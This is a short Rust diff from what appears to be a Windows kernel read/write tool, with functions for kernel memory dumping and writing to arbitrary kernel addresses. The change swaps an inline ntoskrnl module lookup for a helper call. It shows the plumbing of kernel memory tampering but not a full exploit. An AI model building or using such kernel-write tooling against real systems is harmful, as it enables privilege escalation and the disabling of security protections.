@@ -12,8 +12,7 @@ const THREAD_PRIORITY_NORMAL: i32 = 0;
 
 pub fn open_krw(dev: &Device) -> Result<(KernelRW<'_>, Vec<u8>)> {
     let mods = get_kernel_modules()?;
-    let nt = find_mod(&mods, &["ntoskrnl.exe", "ntkrnlmp.exe", "ntkrnlpa.exe", "ntkrpamp.exe"])
-        .context("ntoskrnl not found")?;
+    let nt = crate::utils::resolve_ntoskrnl(dev, &mods)?;
     println!("[+] ntoskrnl VA=0x{:016X}", nt.va);
     let path = ntoskrnl_disk_path(&mods)?;
     let pe = std::fs::read(&path).with_context(|| format!("cannot read {}", path))?;
@@ -47,8 +46,7 @@ pub fn cmd_kdump(dev: &Device, target_va: u64, count: u64) -> Result<()> {
 #[allow(named_asm_labels)]
 pub fn cmd_kwrite(dev: &Device, target_va: u64, write_value: u64) -> Result<()> {
     let mods = get_kernel_modules()?;
-    let nt = find_mod(&mods, &["ntoskrnl.exe", "ntkrnlmp.exe", "ntkrnlpa.exe", "ntkrpamp.exe"])
-        .context("ntoskrnl not found")?;
+    let nt = crate::utils::resolve_ntoskrnl(dev, &mods)?;
     println!("[+] ntoskrnl VA=0x{:016X}", nt.va);
 
     let path = ntoskrnl_disk_path(&mods)?;
